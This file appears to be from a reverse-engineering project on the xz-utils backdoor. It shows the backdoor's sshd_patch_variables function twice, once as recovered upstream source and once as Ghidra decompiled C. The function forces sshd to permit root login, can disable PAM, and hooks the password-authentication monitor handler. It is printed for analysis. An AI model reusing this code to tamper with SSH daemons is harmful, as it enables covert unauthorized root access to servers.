// /home/kali/xzre-ghidra/xzregh/107D50_sshd_patch_variables.c
// Function: sshd_patch_variables @ 0x107D50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_patch_variables(BOOL skip_root_patch, BOOL disable_pam, BOOL replace_monitor_reqtype, int monitor_reqtype, global_context_t * global_ctx)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief Patches the sshd configuration
 *
 *   @param skip_root_patch TRUE to keep current configuration, FALSE to enable root login
 *   @param disable_pam TRUE to disable PAM, FALSE to keep current configuration
 *   @param replace_monitor_reqtype TRUE to replace the `type` field in `struct mon_table`
 *   for `MONITOR_REQ_AUTHPASSWORD`. FALSE to increment it by 1 (from `MONITOR_REQ_AUTHPASSWORD` to `MONITOR_ANS_AUTHPASSWORD`)
 *   @param monitor_reqtype the new value to apply, if @p replace_monitor_reqtype is TRUE
 *   @param global_ctx
 *   @return BOOL TRUE if successful, FALSE if modifications couldn't be applied
 *
 * Upstream implementation excerpt (xzre/xzre_code/sshd_patch_variables.c):
 *     BOOL sshd_patch_variables(
 *     	BOOL skip_root_patch,
 *     	BOOL disable_pam,
 *     	BOOL replace_monitor_reqtype,
 *     	int monitor_reqtype,
 *     	global_context_t *global_ctx
 *     ){
 *     	if(!global_ctx){
 *     		return FALSE;
 *     	}
 *     	sshd_ctx_t *sshd_ctx = global_ctx->sshd_ctx;
 *     	if(!sshd_ctx){
 *     		return FALSE;
 *     	}
 *     	if(!sshd_ctx->have_mm_answer_authpassword
 *         || !sshd_ctx->mm_answer_authpassword_hook
 *     	){
 *     		return FALSE;
 *     	}
 *     
 *     	if(!skip_root_patch){
 *     		int *permit_root_login = sshd_ctx->permit_root_login_ptr;
 *     		if(!permit_root_login){
 *     			return FALSE;
 *     		}
 *     		if(*permit_root_login < 0
 *     		|| (*permit_root_login > PERMIT_NO_PASSWD && *permit_root_login != PERMIT_YES)){
 *     			return FALSE;
 *     		}
 *     		*permit_root_login = PERMIT_YES;
 *     	}
 *     
 *     	if(disable_pam){
 *     		int *use_pam = sshd_ctx->use_pam_ptr;
 *     		if(!use_pam || *use_pam > TRUE){
 *     			return FALSE;
 *     		}
 *     		*use_pam = FALSE;
 *     	}
 *     
 *     	sshd_monitor_func_t *mm_answer_authpassword_ptr = sshd_ctx->mm_answer_authpassword_ptr;
 *     
 *     	if(!replace_monitor_reqtype){
 *     		// read reqtype from `monitor` struct
 *     		monitor_reqtype = *(int *)PTRDIFF(mm_answer_authpassword_ptr, 8) + 1;
 *     	}
 *     	sshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;
 *     	// install authpassword hook
 *     	*mm_answer_authpassword_ptr = sshd_ctx->mm_answer_authpassword_hook;
 *     	return TRUE;
 *     }
 */

BOOL sshd_patch_variables
               (BOOL skip_root_patch,BOOL disable_pam,BOOL replace_monitor_reqtype,
               int monitor_reqtype,global_context_t *global_ctx)

{
  int iVar1;
  uint *puVar2;
  sshd_ctx_t *sshd_ctx;
  sshd_ctx_t *sshd_ctx_1;
  int *use_pam;
  
  if ((((global_ctx == (global_context_t *)0x0) ||
       (sshd_ctx = global_ctx->sshd_ctx, sshd_ctx == (sshd_ctx_t *)0x0)) ||
      (sshd_ctx_1 = (sshd_ctx_t *)sshd_ctx->mm_answer_authpassword_hook,
      sshd_ctx_1 == (sshd_ctx_t *)0x0)) || (sshd_ctx->have_mm_answer_authpassword == 0)) {
    return 0;
  }
  if (skip_root_patch == 0) {
    use_pam = sshd_ctx->permit_root_login_ptr;
    if (use_pam == (int *)0x0) {
      return 0;
    }
    iVar1 = *use_pam;
    if (iVar1 < 3) {
      if (iVar1 < 0) {
        return 0;
      }
      *use_pam = 3;
    }
    else if (iVar1 != 3) {
      return 0;
    }
  }
  if (disable_pam != 0) {
    puVar2 = (uint *)sshd_ctx->use_pam_ptr;
    if (puVar2 == (uint *)0x0) {
      return 0;
    }
    if (1 < *puVar2) {
      return 0;
    }
    *puVar2 = 0;
  }
  if (replace_monitor_reqtype == 0) {
    monitor_reqtype = *(int *)(sshd_ctx->mm_answer_authpassword_ptr + -1) + 1;
  }
  sshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;
  *sshd_ctx->mm_answer_authpassword_ptr = (sshd_monitor_func_t)sshd_ctx_1;
  return 1;
}

